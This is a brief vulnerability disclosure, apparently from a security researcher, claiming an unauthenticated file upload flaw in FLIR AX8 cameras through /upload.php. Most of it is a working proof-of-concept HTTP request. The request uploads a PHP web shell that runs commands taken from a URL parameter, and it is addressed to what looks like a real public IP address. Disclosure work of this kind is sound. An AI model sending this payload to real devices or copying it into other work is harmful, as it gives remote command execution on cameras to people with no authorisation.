## Unauthority upload in FLIR AX8

### Description

In FLIR AX8 <=1.46 has an Unauthority file upload vulnerabililty in /upload.php

`upload.php`

![image-20250529174454968](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505291744041.png)

- This area is can upload firmware to control the AX8 update .
-  Uploading updates through the construction of compressed files, and the  system decompressing the updates, can lead to arbitrary file upload or  command execution.

```http
POST /upload.php HTTP/1.1
Host: 222.103.211.89:8004
User-Agent: Mozilla/5.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary12345
Content-Length: 200

------WebKitFormBoundary12345
Content-Disposition: form-data; name="file"; filename="malicious.php.tar"
Content-Type: application/x-tar

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary12345--
```



![image-20250526000719391](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505260007519.png)